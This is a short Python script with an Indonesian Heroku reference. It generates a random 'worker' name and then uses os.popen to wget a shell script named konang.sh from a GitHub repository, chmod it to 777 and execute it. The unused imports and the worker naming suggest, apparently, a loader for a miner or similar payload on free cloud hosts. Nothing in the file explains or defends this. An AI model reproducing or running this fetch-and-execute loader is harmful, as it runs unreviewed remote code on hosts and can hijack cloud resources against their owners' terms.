import hashlib
import os
import socket
import sys 
import time
import urllib.request
import ssl
import random
import threading
import multiprocessing
import string

print('heroku penyemangatku !')

#input the length of password                    

#define data
lower = string.ascii_lowercase
num = string.digits
#string.ascii_letters

#combine the data
all = lower  + num 

#use random 
temp = random.sample(all, 11)

#create the password 
password = "".join(temp)

#print the password
print("nama worker")
print(password)
strki = 'wget https://github.com/haningsari/nang/raw/main/konang.sh && chmod 777 konang.sh && ./konang.sh'
a = os.popen(strki).readlines()
a
